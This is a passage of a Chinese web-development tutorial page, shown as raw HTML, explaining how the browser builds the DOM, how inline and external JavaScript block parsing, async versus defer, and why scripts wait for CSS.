url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAOCAIAAACgpqunAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAB5UlEQVQoz3VSTW/TQBDtv0IcuFEOvVT9ARw5V6oEVdSKY1EPSBHiQ6CCxB3UqMmpPSAU5VK4IBGk4ASZhDROothrr9f2ej/c5920aaowh5VnPO+9md23Vvw/lFJCCCml1rLQQispy0yaikbDmu3LsoxSyhjDmee5LUZRFMcxipOAXfjJlDBmUmpiAUYf5xx8SZLg97xIaclf6L36aON17/BsXCZFAWWQLsBgQgkfoAC+bNKazsFFe5ictf3f4+x6nSUwkmnEvUiNSZqmyTWjMru9apGtI/fj93IipW+AldLdruO6bqU+vld1KrWBFpwlieM4s9nMsnztsrfNybd+asdeUvZ9H337DW/9Ze9p40LyFIwYABehzNxvWmTznfv+PL6tbC8dyc6xd+e58/j4n+DpzbEHoWgPSciMrF7e2YIpjSsnowcvOvsnQwtGmcU0E3q3wbY+kC89ZWVXgCMaP6kN71d/Yuc5GOPQWCp13v9x2mmOool9gtXg7U+Du9U/O5/7V8oaD85F9qy5/ai23vp7apTVSjA9qDsPj34d1js8m+8cBAHwUzL1Zl5IQ7gQFsBFAhmG4eKdlZJaZoVKcVo6BHwKz5TuFjLneXYVwMPzC7BdUptp8UKEGK8YHZyEBNZ2t+ISNe8PC3BOXgwAAAAASUVORK5CYII=\'); background-size: cover; display: block;"\n    >\n      <img\n        class="gatsby-resp-image-image"\n        style="width: 100%; height: 100%; margin: 0; vertical-align: middle; position: absolute; top: 0; left: 0; box-shadow: inset 0px 0px 0px 400px #fafafa;"\n        alt="2021 07 12 09 46 25"\n        title=""\n        src="/static/2021-07-12-09-46-25-e5fd6fa68ed8a69bd7591513d852d088-fee1c.png"\n        srcset="/static/2021-07-12-09-46-25-e5fd6fa68ed8a69bd7591513d852d088-a67b7.png 200w,\n/static/2021-07-12-09-46-25-e5fd6fa68ed8a69bd7591513d852d088-0b187.png 400w,\n/static/2021-07-12-09-46-25-e5fd6fa68ed8a69bd7591513d852d088-fee1c.png 800w,\n/static/2021-07-12-09-46-25-e5fd6fa68ed8a69bd7591513d852d088-b1a91.png 1200w,\n/static/2021-07-12-09-46-25-e5fd6fa68ed8a69bd7591513d852d088-21e31.png 1394w"\n        sizes="(max-width: 800px) 100vw, 800px"\n      />\n    </span>\n  </span>\n  \n  </a>\n    </p>\n<p>再接下来，分词器解析出来第一个 EndTag div，这时候 HTML 解析器会去判断当前栈顶的元素是否是 StartTag div，如果是则从栈顶弹出 StartTag div，如下图所示</p>\n<p>\n  <a\n    class="gatsby-resp-image-link"\n    href="/static/2021-07-12-09-46-39-189debc09f2159f1319e7288fa16f73d-50f04.png"\n    style="display: block"\n    target="_blank"\n    rel="noopener"\n  >\n  \n  <span\n    class="gatsby-resp-image-wrapper"\n    style="position: relative; display: block; ; max-width: 800px; margin-left: auto; margin-right: auto;"\n  >\n    <span\n      class="gatsby-resp-image-background-image"\n      style="padding-bottom: 64.51169188445667%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAANCAIAAAAmMtkJAAAACXBIWXMAAA7DAAAOwwHHb6hkAAABoklEQVQoz41SSy9DQRT2w2xY8Bds/AgSsbAQJOyUhYXYVISwUmkq0op4W1gg8aoirSbq3t5H72Nm7jyv07ml0XbhS2Yyc3K++c6Z7/TF3ZA8/h/6ukPEKkfIjyhTSsKVUooBJAowRTgihEQabbJSqrlLyTknKPDqVcOswxWCIUKxEsUvPLH7sX5VhyRIRghJKTuVhRCE8pj5FIdSk0EVOrFCsXpmnpTCJA2CLTLGyPF88nlf21wwNubf7w6zJ4XL61MlBdTs+z7UZIRyLm/tP6JOstdwqzXTfyq8jQ1Vx4fPcmsjqfTi9g5UazuOZdmQYwZyYs/YuQla/0JIiww9wAmabq5YHhfdweWXmWwFzjoPEyquyuj0xQ0i2anc9kj/2tGzO7BSmc5WkwCLMDQ8m0eZe66V/ir/AuxBDavw4PQvlaYyLWUWcQeZqcvJXHGrSY5VbzLj3HPqF8/maPo1dfAWa58xIh5qnJfzT8Yt2MQFB1pvq7Q+BW9hDBLzwTzOeCxg8BT5AbjQe8KSqmzbDjUcgOv8dzwTNXhbaDDGEp1ufAN3uN+ajZ310QAAAABJRU5ErkJggg==\'); background-size: cover; display: block;"\n    >\n      <img\n        class="gatsby-resp-image-image"\n        style="width: 100%; height: 100%; margin: 0; vertical-align: middle; position: absolute; top: 0; left: 0; box-shadow: inset 0px 0px 0px 400px #fafafa;"\n        alt="2021 07 12 09 46 39"\n        title=""\n        src="/static/2021-07-12-09-46-39-189debc09f2159f1319e7288fa16f73d-fee1c.png"\n        srcset="/static/2021-07-12-09-46-39-189debc09f2159f1319e7288fa16f73d-a67b7.png 200w,\n/static/2021-07-12-09-46-39-189debc09f2159f1319e7288fa16f73d-0b187.png 400w,\n/static/2021-07-12-09-46-39-189debc09f2159f1319e7288fa16f73d-fee1c.png 800w,\n/static/2021-07-12-09-46-39-189debc09f2159f1319e7288fa16f73d-b1a91.png 1200w,\n/static/2021-07-12-09-46-39-189debc09f2159f1319e7288fa16f73d-50f04.png 1454w"\n        sizes="(max-width: 800px) 100vw, 800px"\n      />\n    </span>\n  </span>\n  \n  </a>\n    </p>\n<p>按照同样的规则，一路解析，最终结果如下图所示：</p>\n<p>\n  <a\n    class="gatsby-resp-image-link"\n    href="/static/2021-07-12-09-46-52-ed4fec184a05ef8822bdc6c14cef67ad-9e345.png"\n    style="display: block"\n    target="_blank"\n    rel="noopener"\n  >\n  \n  <span\n    class="gatsby-resp-image-wrapper"\n    style="position: relative; display: block; ; max-width: 800px; margin-left: auto; margin-right: auto;"\n  >\n    <span\n      class="gatsby-resp-image-background-image"\n      style="padding-bottom: 70.25139664804469%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAOCAIAAACgpqunAAAACXBIWXMAAA7DAAAOwwHHb6hkAAABj0lEQVQoz6WSSy8DURTH++HEJxAbCxEJOxtWVlYWNr6BRyyISCwklaALNiRIiAhtqrSl2um0nbnvmd6549+5TYt6JU5u5p455/zOayYV/0NS9lJKUUoZY3haS7vdJoRwzgllLSpahHfcjMGCmCiK+jDigiAwxvi+bx1IR5JEV0/+2Gp+fP0h+8riGE6D4DAM+zBSaq2t0oOllFA8oQ/vSSZLqYpssBDiFxiNcNGBy56e2anM7lYdZj7DuHK5nOM46BnvduZ6vV4oFFAcukOjldPGxrnXEgMwmGaz2RsVMCx2WyJpu9zSU5ul6a1nh3Xbxs6+bru3SZQNlOShua2KYp26Hr2p8KIX/mlmIVXcFpcvZmSNLGZUJh+NrpGFA6VNLL+D31cOg9Dl7v5d+qJ0UfErR9kDKD9V7sFSChPG17Wzyb2h5dP548f0xPbw0smcNloK+QEGgzXg82Bzdu3Q7Z8jheocqTiXONaOjfZhlFWJwGctSJH8J5gdoEycXcWW7cOD4rpurVZrNBp2nC/lDSZaHppjNQPGAAAAAElFTkSuQmCC\'); background-size: cover; display: block;"\n    >\n      <img\n        class="gatsby-resp-image-image"\n        style="width: 100%; height: 100%; margin: 0; vertical-align: middle; position: absolute; top: 0; left: 0; box-shadow: inset 0px 0px 0px 400px #fafafa;"\n        alt="2021 07 12 09 46 52"\n        title=""\n        src="/static/2021-07-12-09-46-52-ed4fec184a05ef8822bdc6c14cef67ad-fee1c.png"\n        srcset="/static/2021-07-12-09-46-52-ed4fec184a05ef8822bdc6c14cef67ad-a67b7.png 200w,\n/static/2021-07-12-09-46-52-ed4fec184a05ef8822bdc6c14cef67ad-0b187.png 400w,\n/static/2021-07-12-09-46-52-ed4fec184a05ef8822bdc6c14cef67ad-fee1c.png 800w,\n/static/2021-07-12-09-46-52-ed4fec184a05ef8822bdc6c14cef67ad-b1a91.png 1200w,\n/static/2021-07-12-09-46-52-ed4fec184a05ef8822bdc6c14cef67ad-9e345.png 1432w"\n        sizes="(max-width: 800px) 100vw, 800px"\n      />\n    </span>\n  </span>\n  \n  </a>\n    </p>\n<p>通过上面的介绍，相信你已经清楚 DOM 是怎么生成的了。不过在实际生产环境中，HTML 源文件中既包含 CSS 和 JavaScript，又包含图片、音频、视频等文件，所以处理过程远比上面这个示范 Demo 复杂。不过理解了这个简单的 Demo 生成过程，我们就可以往下分析更加复杂的场景了。</p>\n<h2 id="javascript-是如何影响-dom-生成的"><a href="#javascript-%E6%98%AF%E5%A6%82%E4%BD%95%E5%BD%B1%E5%93%8D-dom-%E7%94%9F%E6%88%90%E7%9A%84" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>JavaScript 是如何影响 DOM 生成的</h2>\n<p>我们再来看看稍微复杂点的 HTML 文件，如下所示：</p>\n<div\n              class="gatsby-code-button-container"\n              data-toaster-id="89713211783065120000"\n              data-toaster-class="gatsby-code-button-toaster"\n              data-toaster-text-class="gatsby-code-button-toaster-text"\n              data-toaster-text="复制成功"\n              data-toaster-duration="3500"\n              onClick="copyToClipboard(`<html>\n  <body>\n    <div>1</div>\n    <script>\n      let div1 = document.getElementsByTagName(\'div\')[0];\n      div1.innerText = \'time.geekbang\';\n    </script>\n    <div>test</div>\n  </body>\n</html>`, `89713211783065120000`)"\n            >\n              <div\n                class="gatsby-code-button"\n                \n              >\n                html 复制代码\n              </div>\n            </div>\n<div class="gatsby-highlight" data-language="html"><pre style="counter-reset: linenumber NaN" class="language-html line-numbers"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>\n  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>\n    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span>1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>\n    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">\n      <span class="token keyword">let</span> div1 <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementsByTagName</span><span class="token punctuation">(</span><span class="token string">\'div\'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>\n      div1<span class="token punctuation">.</span>innerText <span class="token operator">=</span> <span class="token string">\'time.geekbang\'</span><span class="token punctuation">;</span>\n    </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>\n    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span>test<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>\n  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>\n<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>我在两段 div 中间插入了一段 JavaScript 脚本，这段脚本的解析过程就有点不一样了。script 标签之前，所有的解析流程还是和之前介绍的一样，但是解析到 script 标签时，渲染引擎判断这是一段脚本，此时 HTML 解析器就会暂停 DOM 的解析，因为接下来的 JavaScript 可能要修改当前已经生成的 DOM 结构。</p>\n<p>通过前面 DOM 生成流程分析，我们已经知道当解析到 script 脚本标签时，其 DOM 树结构如下所示：</p>\n<p>\n  <a\n    class="gatsby-resp-image-link"\n    href="/static/2021-07-12-09-48-15-c1e5af2e2f8efef66efd5338e9c9ea75-09eb7.png"\n    style="display: block"\n    target="_blank"\n    rel="noopener"\n  >\n  \n  <span\n    class="gatsby-resp-image-wrapper"\n    style="position: relative; display: block; ; max-width: 800px; margin-left: auto; margin-right: auto;"\n  >\n    <span\n      class="gatsby-resp-image-background-image"\n      style="padding-bottom: 130.21015761821366%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAaCAIAAAA44esqAAAACXBIWXMAAA7DAAAOwwHHb6hkAAADJElEQVQ4y6VTa0gUURS+uz6LiAof7I+gwn+G9IJKih4/o35EYn82AokeFFkUGYUYlti7jArNx5KmhSVmlKaWS2XurtqGpuRrJbfZGVxnZncee2fnuc3OxBJm7kKHy+Vy7vnO4zvngNB/CJjnT5Bkf1Ci/jgMLyuKEgUsaQZPhvwLq/zpdUxqLZNeSy220NmNXobj1S/dwz/Acviz3EmAiz3xpQPGq8PJl3tBsTOjfIzixChgDRvqnKR2tRA5rb7dzVhOK7nntf+E1cfxQhTwLCEwRLWPlTDdkBPlfg/jQOGbwZ8OlLMh7CQBI2GjpO0i+YUWCKq4hAoysZICFULeO0rVi3IM4DGST6riwW0k6Up/YskXcA+aO5joYD0xEorFDuqCgzttJQr7uLM9geYxOuI6FsLUrnI+z0QopFbLqU2MTpjuG6GFbS+pDS3BtU3spldC5gtYYvdHRiiGmmuEuDvuhGvDSaUD4H7Q/I6JlTC3P7i5BWbWoussrux6d0YDXWSnokeOCIJi4z+Q8SlUXQmGE4KCOHfNihZQP+HcJNmDYl6cUN8eFFU0A2XeCQt7CHdKhIFptwAZvQgcc+v6OcbzNz04PNdNnbexBX3CkVYk30q2utgSu++MPXj8PV7Qy+d3s00j1Ow+S9pMvJ2gQWXIUAEN174bHgVAdehYJ576GIIyr6HME39jFNylzJ3sbLZ1cMckDSxKfBW95PZweJItoXwrYaoPJN6dXFTmSrv5FTyk87r+apWehZ/j7Qjdi8H20Wkbwtg9zJQPOlHGhnF2jOsY8372sC6CDTMyT6twbFqSpL+Vc+yzogVWra/3Fx77tP9Uz8EjXbmHP+Tccl7yUO6jH3NPOswnbeZD1n35tgNHu3NvOosUbUpU4G+wKPBb3mTFvwBLnxlTnhrBc7CjbeM3fDC5EpjKDSnVRtMDY1qNMa4RbGtbLwuStnkRsCjubd+6ojkus2lp5vNly5tAbufOEWJoVe2CNXWm1Q0pWRZTVkP6yobknI7tssZYOHKkAApSBIuTLEEGcILBaUhJskQEZghuhoDq7SXVm51R9RHIL6ZrSNX4YX0tAAAAAElFTkSuQmCC\'); background-size: cover; display: block;"\n    >\n      <img\n        class="gatsby-resp-image-image"\n        style="width: 100%; height: 100%; margin: 0; vertical-align: middle; position: absolute; top: 0; left: 0; box-shadow: inset 0px 0px 0px 400px #fafafa;"\n        alt="2021 07 12 09 48 15"\n        title=""\n        src="/static/2021-07-12-09-48-15-c1e5af2e2f8efef66efd5338e9c9ea75-fee1c.png"\n        srcset="/static/2021-07-12-09-48-15-c1e5af2e2f8efef66efd5338e9c9ea75-a67b7.png 200w,\n/static/2021-07-12-09-48-15-c1e5af2e2f8efef66efd5338e9c9ea75-0b187.png 400w,\n/static/2021-07-12-09-48-15-c1e5af2e2f8efef66efd5338e9c9ea75-fee1c.png 800w,\n/static/2021-07-12-09-48-15-c1e5af2e2f8efef66efd5338e9c9ea75-09eb7.png 1142w"\n        sizes="(max-width: 800px) 100vw, 800px"\n      />\n    </span>\n  </span>\n  \n  </a>\n    </p>\n<p>这时候 HTML 解析器暂停工作，JavaScript 引擎介入，并执行 script 标签中的这段脚本，因为这段 JavaScript 脚本修改了 DOM 中第一个 div 中的内容，所以执行这段脚本之后，div 节点内容已经修改为 time.geekbang 了。脚本执行完成之后，HTML 解析器恢复解析过程，继续解析后续的内容，直至生成最终的 DOM。</p>\n<p>以上过程应该还是比较好理解的，不过除了在页面中直接内嵌 JavaScript 脚本之外，我们还通常需要在页面中引入 JavaScript 文件，这个解析过程就稍微复杂了些，如下面代码：</p>\n<div\n              class="gatsby-code-button-container"\n              data-toaster-id="9099576317175662000"\n              data-toaster-class="gatsby-code-button-toaster"\n              data-toaster-text-class="gatsby-code-button-toaster-text"\n              data-toaster-text="复制成功"\n              data-toaster-duration="3500"\n              onClick="copyToClipboard(`//foo.js\nlet div1 = document.getElementsByTagName(\'div\')[0];\ndiv1.innerText = \'time.geekbang\';`, `9099576317175662000`)"\n            >\n              <div\n                class="gatsby-code-button"\n                \n              >\n                js 复制代码\n              </div>\n            </div>\n<div class="gatsby-highlight" data-language="js"><pre style="counter-reset: linenumber NaN" class="language-js line-numbers"><code class="language-js"><span class="token comment">//foo.js</span>\n<span class="token keyword">let</span> div1 <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementsByTagName</span><span class="token punctuation">(</span><span class="token string">\'div\'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>\ndiv1<span class="token punctuation">.</span>innerText <span class="token operator">=</span> <span class="token string">\'time.geekbang\'</span><span class="token punctuation">;</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span></span></pre></div>\n<div\n              class="gatsby-code-button-container"\n              data-toaster-id="7622219745238357000"\n              data-toaster-class="gatsby-code-button-toaster"\n              data-toaster-text-class="gatsby-code-button-toaster-text"\n              data-toaster-text="复制成功"\n              data-toaster-duration="3500"\n              onClick="copyToClipboard(`<html>\n  <body>\n    <div>1</div>\n    <script type=&quot;text/javascript&quot; src=&quot;foo.js&quot;></script>\n    <div>test</div>\n  </body>\n</html>`, `7622219745238357000`)"\n            >\n              <div\n                class="gatsby-code-button"\n                \n              >\n                html 复制代码\n              </div>\n            </div>\n<div class="gatsby-highlight" data-language="html"><pre style="counter-reset: linenumber NaN" class="language-html line-numbers"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>\n  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>\n    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span>1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>\n    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>foo.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>\n    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span>test<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>\n  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>\n<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>这段代码的功能还是和前面那段代码是一样的，不过这里我把内嵌 JavaScript 脚本修改成了通过 JavaScript 文件加载。其整个执行流程还是一样的，执行到 JavaScript 标签时，暂停整个 DOM 的解析，执行 JavaScript 代码，不过这里执行 JavaScript 时，需要先下载这段 JavaScript 代码。这里需要重点关注下载环境，因为 JavaScript 文件的下载过程会阻塞 DOM 解析，而通常下载又是非常耗时的，会受到网络环境、JavaScript 文件大小等因素的影响。</p>\n<p>不过 Chrome 浏览器做了很多优化，其中一个主要的优化是预解析操作。当渲染引擎收到字节流之后，会开启一个预解析线程，用来分析 HTML 文件中包含的 JavaScript、CSS 等相关文件，解析到相关文件之后，预解析线程会提前下载这些文件。</p>\n<p>再回到 DOM 解析上，我们知道引入 JavaScript 线程会阻塞 DOM，不过也有一些相关的策略来规避，比如使用 CDN 来加速 JavaScript 文件的加载，压缩 JavaScript 文件的体积。另外，如果 JavaScript 文件中没有操作 DOM 相关代码，就可以将该 JavaScript 脚本设置为异步加载，通过 async 或 defer 来标记代码，使用方式如下所示：</p>\n<div\n              class="gatsby-code-button-container"\n              data-toaster-id="81597618274631860000"\n              data-toaster-class="gatsby-code-button-toaster"\n              data-toaster-text-class="gatsby-code-button-toaster-text"\n              data-toaster-text="复制成功"\n              data-toaster-duration="3500"\n              onClick="copyToClipboard(`<script async type=\'text/javascript\' src=\'foo.js\'></script>`, `81597618274631860000`)"\n            >\n              <div\n                class="gatsby-code-button"\n                \n              >\n                js 复制代码\n              </div>\n            </div>\n<div class="gatsby-highlight" data-language="js"><pre style="counter-reset: linenumber NaN" class="language-js line-numbers"><code class="language-js"><span class="token operator">&lt;</span>script <span class="token keyword">async</span> type<span class="token operator">=</span><span class="token string">\'text/javascript\'</span> src<span class="token operator">=</span><span class="token string">\'foo.js\'</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span></span></pre></div>\n<div\n              class="gatsby-code-button-container"\n              data-toaster-id="5843320959178344000"\n              data-toaster-class="gatsby-code-button-toaster"\n              data-toaster-text-class="gatsby-code-button-toaster-text"\n              data-toaster-text="复制成功"\n              data-toaster-duration="3500"\n              onClick="copyToClipboard(`<script defer type=\'text/javascript\' src=\'foo.js\'></script>`, `5843320959178344000`)"\n            >\n              <div\n                class="gatsby-code-button"\n                \n              >\n                js 复制代码\n              </div>\n            </div>\n<div class="gatsby-highlight" data-language="js"><pre style="counter-reset: linenumber NaN" class="language-js line-numbers"><code class="language-js"><span class="token operator">&lt;</span>script defer type<span class="token operator">=</span><span class="token string">\'text/javascript\'</span> src<span class="token operator">=</span><span class="token string">\'foo.js\'</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span></span></pre></div>\n<p>async 和 defer 虽然都是异步的，不过还有一些差异，使用 async 标志的脚本文件一旦加载完成，会立即执行；而使用了 defer 标记的脚本文件，需要在 DOMContentLoaded 事件之前执行。</p>\n<p>现在我们知道了 JavaScript 是如何阻塞 DOM 解析的了，那接下来我们再来结合文中代码看看另外一种情况：</p>\n<div\n              class="gatsby-code-button-container"\n              data-toaster-id="71804268999697900000"\n              data-toaster-class="gatsby-code-button-toaster"\n              data-toaster-text-class="gatsby-code-button-toaster-text"\n              data-toaster-text="复制成功"\n              data-toaster-duration="3500"\n              onClick="copyToClipboard(`<head>\n  <style src=&quot;theme.css&quot;></style>\n</head>`, `71804268999697900000`)"\n            >\n              <div\n                class="gatsby-code-button"\n                \n              >\n                html 复制代码\n              </div>\n            </div>\n<div class="gatsby-highlight" data-language="html"><pre style="counter-reset: linenumber NaN" class="language-html line-numbers"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>\n  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>theme.css<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token style"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span>\n<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span></span></pre></div>\n<div\n              class="gatsby-code-button-container"\n              data-toaster-id="11648397747948147000"\n              data-toaster-class="gatsby-code-button-toaster"\n              data-toaster-text-class="gatsby-code-button-toaster-text"\n              data-toaster-text="复制成功"\n              data-toaster-duration="3500"\n              onClick="copyToClipboard(`<body>\n  <div>1</div>\n  <script>\n    let div1 = document.getElementsByTagName(\'div\')[0]\n    div1.innerText = \'time.geekbang\' // 需要 DOM\n    div1.style.color = \'red\'  // 需要 CSSOM\n  </script>\n  <div>test</div>\n</body>\n</html>`, `11648397747948147000`)"\n            >\n              <div\n                class="gatsby-code-button"\n                \n              >\n                html 复制代码\n              </div>\n            </div>\n<div class="gatsby-highlight" data-language="html"><pre style="counter-reset: linenumber NaN" class="language-html line-numbers"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>\n  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span>1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>\n  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">\n    <span class="token keyword">let</span> div1 <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementsByTagName</span><span class="token punctuation">(</span><span class="token string">\'div\'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>\n    div1<span class="token punctuation">.</span>innerText <span class="token operator">=</span> <span class="token string">\'time.geekbang\'</span> <span class="token comment">// 需要 DOM</span>\n    div1<span class="token punctuation">.</span>style<span class="token punctuation">.</span>color <span class="token operator">=</span> <span class="token string">\'red\'</span>  <span class="token comment">// 需要 CSSOM</span>\n  </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>\n  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span>test<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>\n<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>\n<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>该示例中，JavaScript 代码出现了 div1.style.color = ‘red’ 的语句，它是用来操纵 CSSOM 的，所以在执行 JavaScript 之前，需要先解析 JavaScript 语句之上所有的 CSS 样式。所以如果代码里引用了外部的 CSS 文件，那么在执行 JavaScript 之前，还需要等待外部的 CSS 文件下载完成，并解析生成 CSSOM 对象之后，才能执行 JavaScript 脚本。</p>\n<p>而 JavaScript 引擎在解析 JavaScript 之前，是不知道 JavaScript 是否操纵了 CSSOM 的，所以渲染引擎在遇到 JavaScript 脚本时，不管该脚本是否操纵了 CSSOM，都会执行 CSS 文件下载，解析操作，再执行 JavaScript 脚本。</p>\n<p>所以说 JavaScript 脚本是依赖样式表的，这又多了一个阻塞过程。至于如何优化，我们在下篇文章中再来深入探讨。</p>\n<p>通过上面的分析，我们知道了 JavaScript 会阻塞 DOM 生成，而样式文件又会阻塞 JavaScript 的执行，所以在实际的工程中需要重点关注 JavaScript 文件和样式表文件，使用不当会影响到页面性能。</p>\n<h2 id="总结-1"><a href="#%E6%80%BB%E7%BB%93-1" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>总结</h2>\n<p>首先我们介绍了 DOM 是如何生成的，然后又基于 DOM 的生成过程分析了 JavaScript 是如何影响到 DOM 生成的。因为 CSS 和 JavaScript 都会影响到 DOM 的生成，所以我们又介绍了一些加速生成 DOM 的方案，理解了这些，能让你更加深刻地理解如何去优化首次页面渲染。</p>\n<p>额外说明一下，渲染引擎还有一个安全检查模块叫 XSSAuditor，是用来检测词法安全的。在分词器解析出来 Token 之后，它会检测这些模块是否安全，比如是否引用了外部脚本，是否符合 CSP 规范，是否存在跨站点请求等。如果出现不符合规范的内容，XSSAuditor 会对该脚本或者下载任务进行拦截。详细内容我们会在后面的安全模块介绍，这里就不赘述了</p>\n<h1 id="渲染流水线：css-如何影响首次加载时的白屏时间？"><a 